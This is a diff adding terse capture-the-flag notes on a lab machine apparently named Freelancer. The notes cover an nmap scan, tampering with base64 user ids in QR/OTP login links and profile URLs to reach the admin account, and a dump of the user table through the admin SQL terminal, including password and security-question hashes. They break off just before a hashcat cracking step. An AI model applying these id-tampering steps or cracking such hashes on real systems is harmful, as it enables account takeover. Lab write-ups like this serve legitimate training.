@@ -1,0 +1,97 @@
+nmap:
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Simple DNS Plus
+80/tcp    open  http          syn-ack nginx 1.25.5
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Freelancer - Job Board & Hiring platform
+|_http-favicon: Unknown favicon MD5: 582290CAF5F37817946D9C6A04D4AF95
+88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-06-02 23:03:23Z)
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack
+464/tcp   open  kpasswd5?     syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-06-02T23:04:19
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 5h00m00s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 52499/tcp): CLEAN (Timeout)
+|   Check 2 (port 52728/tcp): CLEAN (Timeout)
+|   Check 3 (port 57937/udp): CLEAN (Timeout)
+|   Check 4 (port 17732/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+add to /etc/hosts the ip 
+
+there is a some sort of job searching page,we can register as freelancer and employer
+
+we need the employer
+
+enterting the employer user
+
+we got option to generate QR code to enter without credentials 
+
+we use cyberchef for decryting the qr image
+
+we get:
+http://freelancer.htb/accounts/login/otp/MTAwMTE=/fc25bff4d58b5b7efe254f70f325fe0b/
+
+seems that MTAwMTE= is a user id,because after decoding it with base64 its turns to be 10011
+
+in job dashboard there is a job offers with linked profile
+
+http://freelancer.htb/accounts/profile/visit/3/
+
+we change the number to 2 and we get the admin
+
+we got back to QR and change the user id and getting the admin page
+
+after that we get to http://freelancer.htb/admin/#
+
+and get the SQL terminal
+
+using SELECT * FROM information_schema.tables
+
+and we get the table name freelancer_customuser;
+
+SELECT * FROM freelancer_customuser; and we get:
+
+id	password	last_login	username	email	first_name	last_name	is_active	is_staff	is_superuser	security_q1	security_q2	security_q3	failed_login_attempts	address	joined_at	image	user_type
+2	pbkdf2_sha256$600000$IgjtPcBB9VySMPXoeAc8PL$pmpMU81uwwKvdxUBNVk/K4Wwh4pw/fWIseSx4XkyMJo=	2024-06-03T00:38:35.066	admin	johnHalond@freelancer.htb	John	Halond	true	true	true	8be50ed6916ec1127528ed2809a281844bc2429e66c8b9d5751b82f2922b07c88d4a7a85831d694b220fc432e2397c9bf7c9a53bbb8e58b7bee1edebe2a58525	659989711347216827e21206501d518ec1714ebf7ebfae1ba7efd8be98704ded5d2aa1d525e2f473be01a76a7a02ce56ad1a9cddd8785d62fdbb224ca319bb46	762907cf53f842718f1a34c11b24ec74062e18c12e6f19e500a23d9c244fea496f02ec5424a0754f2710e3f0dd217f973fc6260e07c99fc1ca1e22c848f56fc7	-999999	US East - Boston	2020-11-12T01:45:52.109	freelancer/templates/static/assets/images/users_profiles/2.jpg	Employer
+3	pbkdf2_sha256$600000$tip7FkNIoN7nKNTLckQuiY$Q6g1Qx0B8ul/qxGQ0hX4lYoHc3jxkrWaf3lZvNknfWU=	2023-09-19T05:08:55.133	tomHazard	tomHazard@freelancer.htb	Tom	Hazard	true	false	false	13ba0ef4d4b6c8134d69d77cbe6c942394805c40c586740dcf28cdfac533223173c726ab1fa558dc92df776d7e03a2ec436c996dfa00fe8147cdf7435022bb18	787445cd9a310e153d755c8fab54c0d138ebceded3e8bc690c898b90e6cd42b8475bfc690e92834104be9abc0cc27f2da49ea95b8a6840458a7621e3166ef222	6523f41002b050e11944c3a84ed1467381ffc166c061d4a7ab490f2157486ab8b1a61c542331224f987d3b85ff55810f3934dc317b8584395a0a8726a34b33e8	0	US West - Los Angeles	2020-01-19T02:04:41.784	freelancer/templates/static/assets/images/users_profiles/3.jpg	Employer
+4	pbkdf2_sha256$600000$x9n1jiojmHAAzp3RSfvh3A$UmFMGDpFb6Gjz1XHmqNoO2eH7+7kYFfrDahLkJGpoUo=	2023-09-19T07:15:12.980	martin1234	martin.rose@hotmail.com	Martin	Rose	true	false	false	79b6583f5324bb25309e54f483531cc2047fd061da985ca2f114befa7116f193d54ee5b8d093e3f6a70bbe2bcdbc8e014d805e7bec4af02f6dd974a7c62c72eb	2aa00354db1988fd78426ce53407b130a551e23ac8330b4f28e17adad4e14a392ffa64e4e2568eb632b833715ad7bfbc04d31e1086cb2a4b790b88b4c6a3058d	289d3fe3bb3ed3d76aa3c37364492a5956c52d1fc1584dffa104526f7ee8130c565f1c1d86ff6b9aa9e45fab846f9cb43ab0de2438e1aec946e0bc42d2259715	0	Canada West - Vancouver	2021-02-01T02:06:58.483	freelancer/templates/static/assets/images/users_profiles/4.jpg	Employer
+5	pbkdf2_sha256$600000$R9zyIpTUoHWkY3OK9mDf80$Qzm3CzI3RN6sJ3c8Ntuif9hqjZCIe+J9DxQGgPgVc3I=	2023-09-19T07:17:09.850	crista.W	crista.Watterson@gmail.com	Crista	Watterson	true	false	false	60a7f05ada80f4b8177b1c341b42ad62f3b3f167fb4fc3cd4d873a9d59cdc74e0f780d82d896573efb9c8346bd70f9ed482eeaf6a372b2fe68c4d7c86f0f9849	413270b347d01f0ab62c294a5844c08f3b4bd165d8aaf42b679e5bfe84ca98be4f180a64f9e2a4be5b8dd27f63b9ac2a0ad90e51c8825cb342f74298b48dd3a0	7b22d3d8dcdd1ea19529d898b548ca8be4e18f68f27c9c1d158550c9491a471706800dd98ecee9f051cdb2845aefec8fdfb19fda7cf56198a72c2acd2e13a89f	0	Germany - Frankfurt	2022-03-12T02:09:12.671	freelancer/templates/static/assets/images/users_profiles/5.png	Employer
+6	pbkdf2_sha256$600000$4KqR8oqlwUMVVjZuzbz4Wu$2mdmIWr5SyIdLBngGve3pZyS1KaOO4+hlXgmxAeGtVs=	2023-09-19T05:10:58.225	Camellia19970	Camellia@athento.com	Camellia	Renesa	true	false	false	616724022112225ed0c16fb716597706b3175215d72509ae102b542f1977f6db51909e426f9c022bb2df86c8d8bc5c914d481c9894bae9c930f645b7e7480ae5	53460abedc03cbb56b91540226a96ab00352ba0c8bc6f25260db2866345f1adeb13dd831d323607943e7ee8052365a01d5639b7b62373b0d83b94645b9c0c66b	19c7954c152a82d8d46e9dbdd9abe63e7b3d27c0281e19100c2f5ddab1cfd53d43d08ddd3b3b6b2cee0428bb50729dcc8ded5cd0475e59b387271e85451a0eaa	0	Italy - Milan	2024-01-19T02:11:53.906	freelancer/templates/static/assets/images/users_profiles/6.jpg	Employer
+7	pbkdf2_sha256$600000$jP0nxcmm3rWlUWkf1xBqhE$mnABoJ2VkzyUi1LC+IuwjJZOs4/z6yqQG4tpJy1b86A=	null	lisa.Ar	lisa.Arkhader@outlook.com	Lisa	Arkhader	true	false	false	c7505d25801cd2a141dd5178c3d6196998dd41abe766700c2d2d807b9e68281a7566d74b2e734fec6225d7fd4c7baf0d91209eb459796e36d84989ef63dc3e89	edc672326423b8f32e9ded6bd351c0efbbac265859badbbb4944a2c3eca55675e22f4bde9b79cefaca5f842739d8b970b647456a3e5d14435196f7b16f6369b8	54fa52b09126930f2e8f778c8e63176bc3f3fc13191994fca764ba415f681d102226831176b95a4f0a00f2cdef71013f94956046bab395415aa559d695084171	0	UK - London	2024-01-19T02:14:37.108		Freelancer
+8	pbkdf2_sha256$600000$n807xz2S84KMIXaCE1d8cd$HS+8AffbYcIHSXTE7LoYtTiJRAmAqrkq7o+RAqZDPys=	null	SaraArkhader	SaraArkhader@gmail.com	Sara	Arkhader	true	false	false	4142f7d0b933be63004b3cda08142f98d92fa45387aac1ae0d781264e233a8a28385b232218f0f354091cb0d70b8e22de84f9099104b69b1e5b0cd5360b61880	3cf1af9d9b88e54a01bb46c0950eba22f7eee687c96add1156b0d3d5002819011cb4a4ec77b0860c19e02e07b72c956b9ee5ac4645b04b5697d61101235a2726	b3a59a93133cdf183ac37c922b7af436d0c5a2cf99322cf80a6910987b88f378a7b4b9d4551eb4a28441c3102d847631e12034c1075e137d31f2d764a5e07b05	0	US - Atlanta	2024-02-02T02:16:21.844		Freelancer
+9	pbkdf2_sha256$600000$sLNgktJGLeN8BE9mzu7ZaH$dDbEJQWTdNGhw0xfJKzBvAhg+6Ag76WaXeFgjUKE89U=	null	maya001	maya001@hotmail.com	Maya	Ackasha	true	false	false	f02bda7e50467d2693ebecfa24d2f4e33d425c52ff9374b573e5105ea1d684e204d354a4d2c536780bebe2c95f68e2c43533722f33420bf62cd4f815d4ba9288	9b9db72d16cbdd4be4b41be29927ae12e112af08c149930cb5db71a1c98cfe3e6effcd048783146e146b383505a62527f966d5d9c17df921fa98b8e07e9beb93	ef165edad5279e8f16e1bc6813be791526fb3f3e2bf2fb3da0cfbcb473e2563acc275aa976ea993be0652773417ae198c9a7c73575a5857b779e16008ef820b2	0	Egypt - Cairo	2024-02-05T05:58:51.237		Freelancer
+10	pbkdf2_sha256$600000$BYsJKIsg3DqI3DxZ08AL5t$4NYhZbnmJY7qQOsZADGbdDZk5EyS7NBv0NVA21LKLs0=	null	ItachiUchiha	itachi.uchiha@gmail.com	Itachi	Uchiha	true	false	false	24a3c44d415e8cad3b6dab4c8c558354167ad78d6ebd4dc9d5dafe6d0e56acbcd1d073d37abbaf0dde176fcb2b434e3869629d6acb36dcf4cf3771da430032d6	e820ce3b310c8a7995fdf351ee5e07ba1d96770388fc700bb4cd39ede977cd52895853e377a1cecf59cc3b235cef7b2f05f597240b2cb0b790cc6b8c5acf894c	11391a1771affb656332be42ed165508f7029af2c20266900a7018d8da30de6d2d04e839702b9cfbd37786df6a11ea6fdb5c2531fc30e230169825988806cb72	0	The village of Konohagakure	2004-01-11T06:05:18.233	freelancer/templates/static/assets/images/users_profiles/10.jpg	Freelancer
+11	pbkdf2_sha256$600000$Vv05zVNTevRy9j29n3nnmC$WIrntfpqMYGv7x79UZtOXOLOmnskyHItdxKMzh0BPRY=	null	Philippos	philippos007@hacktheworld.eu	Philip	Marcos	true	false	false	200ad492092da5c74b8f64ce3a8adcd764fa23f498c3b9c2755617688ffdedac58455f4c7b6a5ddeec18e6cf2863451f130b33e9eb3d56882b9722599198f5b8	6bccc4061b8879914fbc3444d3a25b141a60f1e6b72eced77e414f037f3da3d702633b3976c473e7fb2cfe04ab805adc357d6326c46655c9866900504e36e10b	cb4eb1c0bcd5eb14160d30b860401c5412fdb874d98781e8b64e8440e24de794b161464dc420de138c559ad10ef2d3a107ed633802278e1460b777cfe8e51a32	0	USA - Washington	2024-01-11T06:07:18.991		Freelancer
+12	pbkdf2_sha256$600000$ItLrs0zNKnvHpa8x81YUET$znvkVByIaU8U+s41mE6RjOd9yrpe1DLBF/l76bMznwo=	null	Jonathon.R	jroman1992@gmail.com	Jonathon	Roman	true	false	false	3f150f14aa0690092c3cc017382bf5f7a6a96b2b2687fb0d9c966918a15887d570c1746d2e5d7b93a84e5781e3e3c54848db682777fad48978d594c4521024f2	f8acc441517b9734fb5b5e25e85127bbd7b10f8d3911133b74ed69d54bdd6a7d9b3a43c0ed69f8c46d157bdef23cabee1ac3ea38ffd9c8b81f0cdc1200dbba85	faa478d3c4a25d5cf09719debbfe2ad4a3c2c7fdb6fa6b58bb6b2f49ad8a34e95a7d70a24ade84df199e52352f8eb84d9c2044c972af37e5bf51de4bdd8a2a35	0	USA - Las Vegas	2022-02-01T06:31:43.104	freelancer/templates/static/assets/images/users_profiles/12.png	Freelancer
+13	pbkdf2_sha256$600000$eyWcuxHnbIoONyvdQ3tZaM$TN4+gH91PqmpGSKpDZiivK1TqGbNfXErBEa558isebo=	null	JohntheCarter	johnholand@secretareas.com	John	Carter	true	false	false	3f150f14aa0690092c3cc017382bf5f7a6a96b2b2687fb0d9c966918a15887d570c1746d2e5d7b93a84e5781e3e3c54848db682777fad48978d594c4521024f2	9b9db72d16cbdd4be4b41be29927ae12e112af08c149930cb5db71a1c98cfe3e6effcd048783146e146b383505a62527f966d5d9c17df921fa98b8e07e9beb93	ef165edad5279e8f16e1bc6813be791526fb3f3e2bf2fb3da0cfbcb473e2563acc275aa976ea993be0652773417ae198c9a7c73575a5857b779e16008ef820b2	0	Canada West - Vancouver	2020-03-10T06:31:43.104	freelancer/templates/static/assets/images/users_profile/13.png	Freelancer
+14	pbkdf2_sha256$600000$ok26XbM8us6jrG4BvlsM6h$IZbj6fZzUIagbziFSpPP68olFK7yrUCFTAZmK7qo7co=	null	Markos	mark.rose@yahoo.com	Mark	Rose	true	false	false	243efcd32bdf5876a9d9737ddcf96a2359cabb45458f011f39f103e1c38b6abdf1f86a36a65acaed1dd72b58d01c170f3bf67719fd242a6a3667e7f96be31100	e35970edaa1e0d8af7d948491b2da0450a49fd9cc1e83c5db4c6f175f9550cf341f642f6be8cfb0bfa476e4258e5088c5ad549087bf02811132ac2fa22b734c6	faa478d3c4a25d5cf09719debbfe2ad4a3c2c7fdb6fa6b58bb6b2f49ad8a34e95a7d70a24ade84df199e52352f8eb84d9c2044c972af37e5bf51de4bdd8a2a35	0	UK - London	2020-01-19T06:34:57.695	freelancer/templates/static/assets/images/users_profiles/3.jpg	Freelancer
+10010	pbkdf2_sha256$600000$EDV6OsGziCOHMqY9RblR9s$t0iZCw2bYEz1xGYNmOug8Db6DymRGtnOhRA0lOcScuM=	2024-06-02T23:14:56.238	testtest	test@test.com	test	test	true	false	false	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	0	test	2024-06-02T23:14:34.300		Freelancer
+10011	pbkdf2_sha256$600000$HVm3JTFXx8knW7xLntqcL7$m1rdEmeEO1Um8JgritpyFN5LQmUBD5A45k/FOVXE5TE=	2024-06-02T23:22:32.566	test1test	user123@test.com	test	test	true	false	false	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	9ece086e9bac491fac5c1d1046ca11d737b92a2b2ebd93f005d7b710110c0a678288166e7fbe796883a4f2e9b3ca9f484f521d0ce464345cc1aec96779149c14	0	test	2024-06-02T23:18:57.691	freelancer/templates/static/assets/images/users_profiles/10011.jpg	Employer
+
+johnHalond@freelancer.htb tomHazard@freelancer.htb looks interesting
+
+now let try to crack it with hashcat:
+
+
